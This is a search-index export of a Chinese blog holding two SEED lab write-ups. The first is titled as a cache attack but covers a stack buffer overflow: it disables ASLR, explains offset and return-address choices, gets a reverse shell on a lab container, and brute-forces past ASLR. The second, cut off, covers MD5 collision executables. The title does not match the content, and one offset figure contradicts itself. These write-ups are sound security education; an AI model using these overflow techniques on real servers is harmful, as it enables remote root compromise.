<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>SEEDLAB：缓存攻击实验</title>
      <link href="/post/88a94389.html"/>
      <url>/post/88a94389.html</url>
      
        <content type="html"><![CDATA[<p><a name="z5A7d"></a></p><h1 id="1-实验内容"><a href="#1-实验内容" class="headerlink" title="1 实验内容"></a>1 实验内容</h1><p><strong>1.1 实验文件的下载和导入</strong><br />下载课程提供的实验室程序。解压到我的虚拟机中，将得到一个名为 Labsetup的文件夹。这个实验室需要的所有文件都包含在这个文件夹中。<br /><img src="https://cdn.nlark.com/yuque/0/2024/png/35921061/1706689102460-d438845a-8d13-4427-98b4-70453809b959.png#averageHue=%23ded9d6&id=A7eBu&originHeight=273&originWidth=891&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title="><br /><strong>1.2 关闭保护措施</strong><br />在开始这个实验室之前，我们需要确保关闭地址随机化对策（ASLR）。ASLR是一种安全功能，它随机化进程使用的内存地址，增加攻击者利用内存漏洞的难度。在大多数现代Linux发行版上，默认情况下启用ASLR。可以使用以下命令执行ALSR的关闭：<br />$ sudo &#x2F;sbin&#x2F;sysctl -w kernel.randomize_va_space&#x3D;0<br /><img src="https://cdn.nlark.com/yuque/0/2024/png/35921061/1706689102740-a48a7fb2-f1be-4fc0-b8c7-bf122a41cce1.png#averageHue=%23171514&id=rR4Yu&originHeight=142&originWidth=1055&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title="></p><p><strong>2.3 了解实验目的</strong><br />在这个实验室中使用的脆弱程序称为stack.c，它在服务器代码文件夹中。此程序有一个缓冲区溢出漏洞，我们的目的是利用此漏洞并获得根权限。<br /><img src="https://cdn.nlark.com/yuque/0/2024/png/35921061/1706689103092-bb108274-4927-469f-8f57-f61ae64dfee8.png#averageHue=%23e5e5e5&id=U9jo5&originHeight=551&originWidth=772&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title="><br />这个程序存在缓冲区溢出漏洞。它从标准输入中读取数据，然后将数据传递给函数bof（）中的另一个缓冲区。原始输入的最大长度可以为517字节，但bof（）中的缓冲区只有BUF大小字节长，小于517。因为strcpy（）不检查边界，所以将会发生缓冲区溢出。该程序将在具有根权限的服务器上运行，其标准输入将被重定向到服务器和远程用户之间的TCP连接。因此，该程序实际上是从一个远程用户，如果用户可以利用这个缓冲区溢出漏洞，他们就可以在服务器上获得一个 root shell。</p><p><a name="EbyVc"></a></p><h1 id="2-实验步骤及结果"><a href="#2-实验步骤及结果" class="headerlink" title="2 实验步骤及结果"></a>2 实验步骤及结果</h1><p><a name="i2kJW"></a></p><h2 id="Task-1-Get-Familiar-with-the-Shellcode"><a href="#Task-1-Get-Familiar-with-the-Shellcode" class="headerlink" title="Task 1: Get Familiar with the Shellcode"></a><strong>Task 1: Get Familiar with the Shellcode</strong></h2><p>看一下shellcode_32.py的源代码，shellcode如下所示，应该是x86_32架构的机器代码。shellcode_64.py略微不同，其为x86_64架构的机器代码。下面的shellcode实现的功能应该是在执行三条bash命令。<br />对 shellcode_32.py 进行修改，使其能够删除文件,执行rm命令，需要注意的是，shell长度不能变。<br /><img src="https://cdn.nlark.com/yuque/0/2024/png/35921061/1706689103409-0b7e4322-816f-4a31-a274-1a3c81469736.png#averageHue=%23f1eeed&id=bmtS9&originHeight=848&originWidth=947&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title="></p><p>运行shellcode_32.py和shellcode_64.py分别生成32位和64位的代码载荷。<br /><img src="https://cdn.nlark.com/yuque/0/2024/png/35921061/1706689103792-c64afea2-4c96-4259-bcd3-80d994b07b86.png#averageHue=%23090705&id=lLCTi&originHeight=51&originWidth=958&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title="><br />使用Makefile编译call_shellcode.c生成32位和64位两个版本的调用shellcode的可执行文件。<br /><img src="https://cdn.nlark.com/yuque/0/2024/png/35921061/1706689104096-aa9ebd1c-ca29-4bf8-a737-5ade1958acd5.png#averageHue=%230a0806&id=W8Rwh&originHeight=89&originWidth=1180&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title="><br />然后我们新建 tmpfile 文件并运行 shellcode，全过程和结果如下：<br /><img src="https://cdn.nlark.com/yuque/0/2024/png/35921061/1706689104483-c7a92af7-84f4-4d81-9c00-d77178e116a0.png#averageHue=%230d1109&id=muno7&originHeight=954&originWidth=1165&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title="><br />执行完后，ls命令看一下code文件夹下的文件，发现tmpfile被删除掉了。</p><p><a name="xnJbv"></a></p><h2 id="Task-2-Level-1-Attack"><a href="#Task-2-Level-1-Attack" class="headerlink" title="Task 2: Level-1 Attack"></a><strong>Task 2: Level-1 Attack</strong></h2><p>进入 server-code 文件夹下，执行命令<br />$ make<br />$ make install<br />然后返回其目录labsetup，执行命令启动 docker<br />$ dcbuild<br />$ dcup<br />第一个攻击目标运行在10.9.0.5:9090上。使用nc连接一下10.9.0.5 9090，不传入任何载荷，显示Returned Properly表示返回值正确。进入 attack-code 文件夹，执行<br />$ echo hello | nc 10.9.0.5 9090<br />Ctrl+z<br />然后关闭attack-code 文件夹的终端<br /><img src="https://cdn.nlark.com/yuque/0/2024/png/35921061/1706689105363-0a29224c-eae9-45e9-847d-9f0ecfd746f1.png#averageHue=%230b0907&id=ZpRhr&originHeight=265&originWidth=865&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title="></p><p><a name="YsUh2"></a></p><h3 id="Attack"><a href="#Attack" class="headerlink" title="Attack"></a><strong>Attack</strong></h3><p>（记得先关闭地址随机化，前面提过）执行两次打印出的结果一致且输出地址为 0xffffd528，则说明 memory randomization 已关闭。修改 exploit.py 文件，我们先将其中的 shellcode 替换为 shellcode_32.py的 shellcode<br /><img src="https://cdn.nlark.com/yuque/0/2024/png/35921061/1706689105681-e819108a-b511-4a75-ad36-2a1a681c8fba.png#averageHue=%23f0efef&id=nurQc&originHeight=710&originWidth=938&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title="></p><p>根据exploit.py的源代码，最终的载荷content在服务端地址的开始位置即缓冲区地址。有start、ret、offset三个参数需要设置，第一个参数start表示shellcode的开始位置，第二个参数和第三个参数根据**content[offset:offset + 4] &#x3D; (ret).to_bytes(4,byteorder&#x3D;’little’)**这段代码可知是将offset地址处的内容覆盖为ret。</p><p>所以exploit生成攻击载荷的思路如下图所示。通过缓冲区溢出，将正确的返回地址覆盖，修改为ret。继续写入，使用空操作和编写的shellcode覆盖正确返回地址更高的栈空间。所以ret应该为shellcode及空操作区域的地址，这样当调用函数的栈帧返回时，会返回到ret指针的位置，即继续执行编写的shellcode以及一些空操作。<br />start设置为<strong>517 - len(shellcode)</strong> ，即将shellcode放在覆盖区域的最后面；将ret设置为<strong>0xffffd338+4+4</strong>，即返回地址+4的位置，这样就将返回地址设置为栈中shellcode和空操作区域的开始地址了。然后设置offset为<strong>0xffffd338−0xffffd2c8+4</strong>，即正确返回地址的位置相对于缓冲区地址的偏移量，用于将ret准确覆盖正确返回地址。<br /><img src="https://cdn.nlark.com/yuque/0/2024/png/35921061/1706689106182-4931f293-e998-4349-962a-5bce7f357381.png#averageHue=%23f9f8f7&id=w7Wgv&originHeight=344&originWidth=952&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title="><br />然后执行<br />$ .&#x2F;exploit.py<br />$ cat badfile | nc 10.9.0.5 9090<br />根据我在代码中设置的标志：**echo super_hacker! **再查看服务端，当我们看到输出super_hacker!的时候表示攻击成功。<br /><img src="https://cdn.nlark.com/yuque/0/2024/png/35921061/1706689106497-84ec96a8-d111-4505-ab80-08f59c56a6ba.png#averageHue=%230a0907&id=dgshB&originHeight=186&originWidth=858&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title="></p><p><a name="ouhiL"></a></p><h3 id="Reverse-Shell"><a href="#Reverse-Shell" class="headerlink" title="Reverse Shell"></a><strong>Reverse Shell</strong></h3><p>根据 Task 要求，通过缓冲区溢出漏洞拿到对方的反弹shell。我们将 shellcode 改为 reverse shell，将 exploit.py 文件修改为如下：<br /><img src="https://cdn.nlark.com/yuque/0/2024/png/35921061/1706689106822-8399b61f-9a07-4be8-a56b-2128fc722bed.png#averageHue=%23fdfcfc&id=AwmT2&originHeight=185&originWidth=904&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title="></p><p>重新编译exploit.py，向10.9.0.5发送badfile文件进行攻击<br /><img src="https://cdn.nlark.com/yuque/0/2024/png/35921061/1706689107122-f49fdf9b-86a2-4755-85b6-dd15f3fdb448.png#averageHue=%23080605&id=PojCz&originHeight=97&originWidth=916&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title="></p><p>启动新 terminal ，执行监听，可以看到获得了权限，可以执行目标主机上的命令。<br /><img src="https://cdn.nlark.com/yuque/0/2024/png/35921061/1706689107460-83255a85-ac30-4c10-8dd8-5545591a1128.png#averageHue=%23141312&id=eMsgB&originHeight=166&originWidth=1053&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title="></p><p><a name="K5b9x"></a></p><h2 id="Task-3-Level-2-Attack"><a href="#Task-3-Level-2-Attack" class="headerlink" title="Task 3: Level-2 Attack"></a><strong>Task 3: Level-2 Attack</strong></h2><p>在这项任务中，我们将通过不显示一个必要的信息来稍微增加攻击的难度。我们的目标服务器是 10.9.0.6（端口号仍然是9090，易攻击的程序仍然是一个32位程序）。让我们先向此服务器发送一条良性消息。我们将看到由目标容器打印出的以下消息。<br />重点在于处理不知道大小的 <a href="https://so.csdn.net/so/search?q=buffer&spm=1001.2101.3001.7020">buffer</a>。解决方法很简单：不知道 offset，那就挨个试一遍（考虑for循环）。同样的，我们先 echo hello进入 attack-code 文件夹，执行<br /><img src="https://cdn.nlark.com/yuque/0/2024/png/35921061/1706689107767-c0ca4bee-a8d1-49b3-9a09-490126a580ee.png#averageHue=%23090706&id=zBOqe&originHeight=115&originWidth=977&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title="></p><p>得到：<br /><img src="https://cdn.nlark.com/yuque/0/2024/png/35921061/1706689108069-12e6221e-3794-4e8d-818a-d81603c81c50.png#averageHue=%230e0b05&id=SJpVc&originHeight=129&originWidth=901&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title="></p><p>修改 exploit.py，依旧设置start &#x3D;** 517- len(shellcode)<strong>让shellcode在payload的最后。将ret设置为</strong>缓冲区地址+buffer大小+8<strong>，由于这里的buffer大小未知，但是大小范围可知为[100, 300]，故为保险将ret设置为</strong>缓冲区地址+300+8**，即ret &#x3D; <strong>0xffffd198+300+8</strong>。接下来要覆盖正确的返回地址，我们不知道正确返回地址在哪里，但是我们可以将所有可能的地址都设置为ret，这样就可以保证覆盖正确返回地址。<br /><img src="https://cdn.nlark.com/yuque/0/2024/png/35921061/1706689108385-0ce3d8c9-5e49-462e-a405-b8c16968282a.png#averageHue=%23fcfbfa&id=Utmth&originHeight=212&originWidth=914&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title="></p><p>然后执行<br /><img src="https://cdn.nlark.com/yuque/0/2024/png/35921061/1706689108670-5b964e49-2c74-4970-9160-27c542964ac0.png#averageHue=%230c0a08&id=qffBO&originHeight=83&originWidth=923&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title="><br />得到了结果<br /><img src="https://cdn.nlark.com/yuque/0/2024/png/35921061/1706689109071-13318737-1476-4604-8c5a-38345af87560.png#averageHue=%230d0a04&id=y1bCw&originHeight=129&originWidth=940&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title="></p><p><a name="ksfcP"></a></p><h2 id="Task-4-Level-3-Attack"><a href="#Task-4-Level-3-Attack" class="headerlink" title="Task 4: Level-3 Attack"></a><strong>Task 4: Level-3 Attack</strong></h2><p>本 task 重点在于处理 64 位地址的 buffer，因此 exploit.py 中的 shellcode <br />要换成 shellcode_64.py 中的 shellcode<br /><img src="https://cdn.nlark.com/yuque/0/2024/png/35921061/1706689109401-08f5d1e5-6a41-4ce9-85e1-d0b82056f98c.png#averageHue=%23fefdfc&id=iIsbr&originHeight=549&originWidth=901&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title="></p><p>和前两个实验一样，先查看一下服务器的相关参数<br /><img src="https://cdn.nlark.com/yuque/0/2024/png/35921061/1706689109699-91aaafac-9b5e-497d-9cae-ec8b14033a5e.png#averageHue=%230a0907&id=Ssh0k&originHeight=112&originWidth=881&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title="></p><p>得到了rbp和buffer的基址<br /><img src="https://cdn.nlark.com/yuque/0/2024/png/35921061/1706689110069-5a1de448-80a5-4c70-a7cf-4b64b433121b.png#averageHue=%230c0a08&id=MBXZz&originHeight=241&originWidth=1155&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title="></p><ul><li>start 设定为一个较小的值，可以直接取 10，表示shellcode地址接近buffer地址</li><li>ret &#x3D; rbp + n :</li><li>ebp 就是刚刚 echo hello 中得到的 rbp，因为关闭了地址随机化，所以每次都一样;</li><li>n ∈ [buffer, buffer + start];</li><li>offset &#x3D; 0x00007fffffffe690 − 0x00007fffffffe5c0 + 8</li></ul><p><img src="https://cdn.nlark.com/yuque/0/2024/png/35921061/1706689110400-4e401bb0-12ca-4074-ad72-7f2785f764ad.png#averageHue=%23fbfaf9&id=t9yi0&originHeight=357&originWidth=897&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title="></p><p>运行 py 文件，将 badfile 传给 server 服务端<br /><img src="https://cdn.nlark.com/yuque/0/2024/png/35921061/1706689110738-8dde31e4-799a-469d-b8c2-a6cd9f0175fb.png#averageHue=%230b0a08&id=XQusD&originHeight=84&originWidth=940&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title="></p><p>得到：super-hacker!<br /><img src="https://cdn.nlark.com/yuque/0/2024/png/35921061/1706689111003-2adf9019-38bc-4065-bd45-8e5b8cbc2a05.png#averageHue=%23090806&id=eUZhM&originHeight=210&originWidth=1121&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title="></p><p><a name="NKFlZ"></a></p><h2 id="Task-5-Level-4-Attack"><a href="#Task-5-Level-4-Attack" class="headerlink" title="**Task 5: Level-4 Attack**"></a>**Task 5: Level-4 Attack**</h2><p>本 task 重点在于执行 return-to-libc 攻击, 还是和前两个实验一样，先查看一下服务器的相关参数（这里我虚拟机重启过，记得重新关闭随机地址！）<br /><img src="https://cdn.nlark.com/yuque/0/2024/png/35921061/1706689111311-74db5095-947c-4b07-894f-7efbe34cbbbc.png#averageHue=%23090706&id=TlcPB&originHeight=107&originWidth=890&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title="></p><p>得到：<br /><img src="https://cdn.nlark.com/yuque/0/2024/png/35921061/1706689111643-cb2e405d-2fb4-4345-a81d-a913b931f021.png#averageHue=%230c0907&id=SG9sx&originHeight=132&originWidth=968&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title="></p><p>缓冲区远小于shellcode大小，因此跟task4一样无法将shellcode放入缓冲区，而放入返回地址之后又会被00截断。<br />但是在执行strcpy时，虽然被00截断了，buffer没有shellcode了，但是shellcode还存在在str中。故如果能够return到str的位置，那么还是可以执行shellcode。所以我们需要知道str相对于rbp或者buffer的大概位置。<br />修改 exploit.py，ret 后加的n取一个较大的值，大概在 1000  到 1400之间，使返回值落在shellcode之前的可能性增大<br /><img src="https://cdn.nlark.com/yuque/0/2024/png/35921061/1706689111964-e5341a94-3304-4e38-8ba9-479f99d01f47.png#averageHue=%23fbfaf9&id=mu7rB&originHeight=364&originWidth=967&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title="><br />然后执行<br /><img src="https://cdn.nlark.com/yuque/0/2024/png/35921061/1706689112289-df436f72-9a96-4516-94c1-068dbe9ede03.png#averageHue=%230a0806&id=B6cPB&originHeight=81&originWidth=892&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title="><br />得到了结果<br /><img src="https://cdn.nlark.com/yuque/0/2024/png/35921061/1706689112615-d3ca4a08-0f30-4707-9333-aa8fd83065c7.png#averageHue=%230b0806&id=UpUrq&originHeight=155&originWidth=999&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title="></p><p><a name="aZL2E"></a></p><h2 id="Task-6-Experimenting-with-the-Address-Randomization"><a href="#Task-6-Experimenting-with-the-Address-Randomization" class="headerlink" title="Task 6: Experimenting with the Address Randomization"></a><strong>Task 6: Experimenting with the Address Randomization</strong></h2><p>打开地址随机化：$ sudo &#x2F;sbin&#x2F;sysctl -w kernel.randomize_va_space&#x3D;2<br />再将以下代码都执行两遍：<br /><img src="https://cdn.nlark.com/yuque/0/2024/png/35921061/1706689112901-10d1ddab-a7c8-4de9-9c33-b4a00d93f11b.png#averageHue=%23090706&id=acVZJ&originHeight=106&originWidth=869&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title="><br /><img src="https://cdn.nlark.com/yuque/0/2024/png/35921061/1706689113195-26abb4d1-11c2-40ba-847f-c4aefd03038c.png#averageHue=%230a0806&id=mRGzP&originHeight=121&originWidth=867&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title="><br />可以看到，每次地址都不相同，导致攻击困难<br /><img src="https://cdn.nlark.com/yuque/0/2024/png/35921061/1706689113537-74ebebeb-701d-4828-bb66-4e08fb02f6a1.png#averageHue=%230b0907&id=Q1j8r&originHeight=308&originWidth=869&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title="><br /><img src="https://cdn.nlark.com/yuque/0/2024/png/35921061/1706689113813-98f48f61-c881-4651-be88-191aacc26f26.png#averageHue=%230b0907&id=WiFX5&originHeight=311&originWidth=975&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title="></p><p>使用 Task2 中 reverse shell 的 exploit.py 代码<br /><img src="https://cdn.nlark.com/yuque/0/2024/png/35921061/1706689114084-b6076d84-dc2d-4f7e-a288-4ccfc5ea0ce8.png#averageHue=%23fdfcfc&id=ROGhZ&originHeight=871&originWidth=955&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title="></p><p>执行命令<br /><img src="https://cdn.nlark.com/yuque/0/2024/png/35921061/1706689114470-98816ffc-a213-47d3-bbd6-da1f37845e1b.png#averageHue=%230d0a07&id=eXs1W&originHeight=55&originWidth=713&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title="></p><p>可以看到很快，大概用时3秒钟，暴力破解几百次后，就获取了控制权<br /><img src="https://cdn.nlark.com/yuque/0/2024/png/35921061/1706689114838-97f4babd-4893-40cf-97ea-9febe494d5e0.png#averageHue=%230e0b09&id=oyluD&originHeight=320&originWidth=820&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title="><br /><img src="https://cdn.nlark.com/yuque/0/2024/png/35921061/1706689115119-447484c6-9f70-4938-9a3c-db4c2df96053.png#averageHue=%23100e0b&id=Tw3vW&originHeight=117&originWidth=640&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title="></p><p><a name="WvwDu"></a></p><h2 id="Tasks-7-Experimenting-with-Other-Countermeasures"><a href="#Tasks-7-Experimenting-with-Other-Countermeasures" class="headerlink" title="Tasks 7: Experimenting with Other Countermeasures"></a><strong>Tasks 7: Experimenting with Other Countermeasures</strong></h2><p>进入 server-code 文件夹，去除 -fno-stack-protector 编译 stack.c， <br />并将 badfile 作为输入<br /><img src="https://cdn.nlark.com/yuque/0/2024/png/35921061/1706689115446-947e0dd0-feea-4825-ab45-f99ef6158b5e.png#averageHue=%23090706&id=UAjWq&originHeight=442&originWidth=1043&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title="></p><p>可以看到检测到了 stack smashing。进入 shellcode 文件夹，去除 -z <br />execstack 编译 call_shellcode.c 并运行<br /><img src="https://cdn.nlark.com/yuque/0/2024/png/35921061/1706689115872-c4284331-57a9-47d1-91c7-bb16847921f5.png#averageHue=%23090706&id=tQOCQ&originHeight=236&originWidth=935&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title="></p><p>可以看到，栈不再可执行。开启栈不可执行可以提供一定程度的保护，但并不能完全避免缓冲区溢出攻击。即使栈不可执行，攻击者仍然可以利用其他方式进行攻击，例如利用<strong>Return-to-libc</strong>攻击。</p>]]></content>
      
      
      <categories>
          
          <category> seedlab </category>
          
      </categories>
      
      
        <tags>
            
            <tag> seedlab 栈溢出 缓冲区溢出 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SEEDLAB：MD5碰撞实验</title>
      <link href="/post/82027ba8.html"/>
      <url>/post/82027ba8.html</url>
      
        <content type="html"><![CDATA[<p><a name="jvf2A"></a></p><h1 id="1-作业题目"><a href="#1-作业题目" class="headerlink" title="1   作业题目"></a><strong>1   作业题目</strong></h1><p>本次实验主要是加深大家对 MD5 碰撞及其原理的理解，使用 SEED 实验环境中的工具及编程语言，完成以下任务：</p><ol><li>使用 md5collgen 生成两个 MD5 值相同的文件，并利用 bless 十六进制编辑 器查看输出的两个文件，描述你观察到的情况；</li><li>参考 Lab3_task2.c 的代码，生成两个 MD5 值相同但输出不同的两个可执行 文件。</li><li>参考 Lab3_task3.c 的代码，生成两个 MD5 值相同但代码行为不相同的可执 行文件。</li><li>回答问题：通过上面的实验，请解释为什么可以做到不同行为的两个可执行 文件具有相同的 MD5 值？</li></ol><p><a name="RHon4"></a></p><h1 id="2-实验步骤及结果"><a href="#2-实验步骤及结果" class="headerlink" title="2   实验步骤及结果"></a><strong>2   实验步骤及结果</strong></h1><p><a name="ehmoD"></a></p><h2 id="2-1-实验一-使用-md5collgen-生成两个-MD5-值相同的文件"><a href="#2-1-实验一-使用-md5collgen-生成两个-MD5-值相同的文件" class="headerlink" title="2.1  实验一-使用 md5collgen 生成两个 MD5 值相同的文件"></a><strong>2.1  实验一-使用 md5collgen 生成两个 MD5 值相同的文件</strong></h2><p>首先在实验 Lab3 文件夹创建一个 prefix.txt，<br /><img src="https://cdn.nlark.com/yuque/0/2024/jpeg/35921061/1706690371493-eb1dbe7b-b376-4c57-b235-4b2db410af39.jpeg#averageHue=%231e2b16&id=f0KhQ&originHeight=111&originWidth=470&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title="></p><p>然后执行命令：md5collgen -p prefix.txt -o out1.bin out2.bin<br /><img src="https://cdn.nlark.com/yuque/0/2024/png/35921061/1706690371856-821ce700-cee1-4d6a-af32-6c44a7ba0a62.png#averageHue=%23444238&id=gbQQ8&originHeight=151&originWidth=478&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title="></p><p>已经发现生成了对应文件 out1.bin 和 out2.bin<br /><img src="https://cdn.nlark.com/yuque/0/2024/png/35921061/1706690372181-6bfe568b-b453-4530-baff-83ba02ebad0f.png#averageHue=%232f3a22&id=bdd8V&originHeight=54&originWidth=461&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title="></p><p>发现两文件的md5 值相同<br /><img src="https://cdn.nlark.com/yuque/0/2024/png/35921061/1706690372456-3333e5e3-8487-4e17-81a2-b318c408127e.png#averageHue=%2324321a&id=hJBvw&originHeight=90&originWidth=413&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title="></p><p>然后执行命令：bless out1.bin和 bless out2.bin，查看两个文件的十六进制信息</p><p><img src="https://cdn.nlark.com/yuque/0/2024/png/35921061/1706690373125-5eda4399-8beb-4121-9005-335792af8fbf.png#averageHue=%23e9edec&id=X6lgO&originHeight=221&originWidth=370&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title="></p><p><img src="https://cdn.nlark.com/yuque/0/2024/png/35921061/1706690373487-92b3834a-f2bb-4509-80c9-09811eee1ffa.png#averageHue=%23e3e7e7&id=QWNrz&originHeight=226&originWidth=371&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title="><br />经过对比发现，这两个 MD5 值相同的文件，out1.bin 、out2.bin 其十六进制内容<br />完全一致。</p><p><strong><em>问题一</em></strong><em>：</em><strong><em>如果您的前缀文件的长度不是</em> <em>64</em> <em>的倍数，会发生什么情</em></strong><br /><strong><em>况？</em></strong></p><p><img src="https://cdn.nlark.com/yuque/0/2024/png/35921061/1706690373864-4a53af69-763a-49d0-84aa-fd07271a8ee1.png#averageHue=%23292c27&id=Sz11U&originHeight=340&originWidth=405&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title="></p><p>答 ：观察 out1.bin 的十六进制，会填  <code>0</code>  把前缀文件的长度补充到  64  的倍数。</p><p><strong><em>问题二</em></strong><em>：</em><strong><em>创建一个正好有</em> <em>64</em> <em>字节的前缀文件，然后再次运行碰撞</em></strong><br /><strong><em>工具，看看会发生什么</em></strong></p><p>答 ：我们把二进制的  64  个字节  0 -63  放入 prefix2.txt，运行 md5collgen，再 用 hexdump -C 看一看这两个文件的值：</p><p><img src="https://cdn.nlark.com/yuque/0/2024/jpeg/35921061/1706690374337-ee7f1943-b420-4931-916f-6b146d4bfdab.jpeg#averageHue=%23303429&id=GNDRJ&originHeight=300&originWidth=362&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title="></p><p>发现并没有像问题一 中的一样给第一个块里补充  0，而是把第一个块原封不动地 保留，用第二个块构造两个文件。</p><p><strong><em>问题三：由</em></strong><em>md5co</em><strong><em>l</em></strong><em>gen</em><strong><em>生成的两个输出文件的数据（128</em> <em>字节）完全不同吗？请确定所有不同的字节</em></strong></p><p><img src="https://cdn.nlark.com/yuque/0/2024/jpeg/35921061/1706690374688-c50ad2bc-0c6b-44dc-8d88-5f784fa6ec3f.jpeg#averageHue=%231b1b1b&id=FLd9U&originHeight=229&originWidth=441&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title="><br />答 ：不是完全不同，共有 6 个字节不同</p><p><a name="bHA9c"></a></p><h2 id="2-2-实验二-生成两个-MD5-值相同但输出不同的两个可执行文件"><a href="#2-2-实验二-生成两个-MD5-值相同但输出不同的两个可执行文件" class="headerlink" title="2.2 实验二-  生成两个 MD5 值相同但输出不同的两个可执行文件"></a><strong>2.2 实验二-  生成两个 MD5 值相同但输出不同的两个可执行文件</strong></h2><p>因为我们在问题一 已经构造出了哈希值相等的 out1.bin 和 out2.bin 了，所以我们 直接在它们的基础上添加一句相同的话， 写入 out3.bin 来看看 1.bin 、2.bin 是否 依然具有相同的哈希值。</p><p><img src="https://cdn.nlark.com/yuque/0/2024/jpeg/35921061/1706690375021-2842db9f-c328-4fd4-bec8-da05e9b8677b.jpeg#averageHue=%231e2b15&id=T3qQD&originHeight=171&originWidth=520&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title="></p><p>尽管我们的实验只有一组，不具有普遍性，但结合 md5sum  原理的理论推导已    经揭示了如果 MD5(M) &#x3D; MD5(N)，则有  MD5(M || T) &#x3D; MD5(N || T)   的特性成立， 我们只是加以验证。</p><p><a name="Es60y"></a></p><h2 id="2-3-实验三-：生成具有相同-MD5-哈希的两个可执行文件"><a href="#2-3-实验三-：生成具有相同-MD5-哈希的两个可执行文件" class="headerlink" title="2.3  实验三 ：生成具有相同  MD5  哈希的两个可执行文件"></a><strong>2.3  实验三 ：生成具有相同  MD5  哈希的两个可执行文件</strong></h2><p>修改 Lab3_task2.c 为以下内容, 0x25 是  %  的 ascii 码，在二进制文件中定位  200<br />个 % 将不会很困难。<br /><img src="https://cdn.nlark.com/yuque/0/2024/jpeg/35921061/1706690375440-f79c7dd3-3ce0-4c5a-bdce-7e29e2fb8d15.jpeg#averageHue=%23edf0ed&id=pHdTt&originHeight=425&originWidth=457&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title="></p><p>先编译一下 ，再执行查看输出结果<br /><img src="https://cdn.nlark.com/yuque/0/2024/jpeg/35921061/1706690375762-49944a99-cdcd-4621-80ba-a2c11a937799.jpeg#averageHue=%23262e1f&id=nNyPC&originHeight=150&originWidth=538&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title="></p><p>因为十六进制的位数过多，故将图片的首尾拼接，忽略中间部分，可以看到 20 0 个  %  的片段，<br /><img src="https://cdn.nlark.com/yuque/0/2024/png/35921061/1706690376090-38d956c7-56da-4143-a5d4-358c43722c9a.png#averageHue=%23282a25&id=cY2ow&originHeight=290&originWidth=467&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title="></p><p>我们需要找到一个分界点，使得它前面的长度是  64  的倍数（根据上个实验可知 它会自动补零）， 它后面开始的  64  个字符全是 % 。这样把前面的部分扔到<br />md5collgen  中构造，把中间的  64  个  %  替换成新产生的两个块，就能得到两个 具有相同哈希值的可执行文件。<br />所以我们可以寻找它第一次进入这  200  个 %  的区域的断点，在这里分界。显然 00003020 就是我们要找的点，我们算出  0x3020 &#x3D; 12320，然后取前  3020 个  字节组成  prefix：</p><p><img src="https://cdn.nlark.com/yuque/0/2024/png/35921061/1706690376525-cbc8301e-e370-46cf-9033-a41d93218f8a.png#averageHue=%23f7f7f4&id=OwZTt&originHeight=118&originWidth=421&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title="></p><p><img src="https://cdn.nlark.com/yuque/0/2024/jpeg/35921061/1706690376846-e8174e31-0e01-446b-82d0-8dc05b4aebaa.jpeg#averageHue=%23353b2d&id=gCzt0&originHeight=182&originWidth=486&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title="></p><p>我们查看一下  out1<br /><img 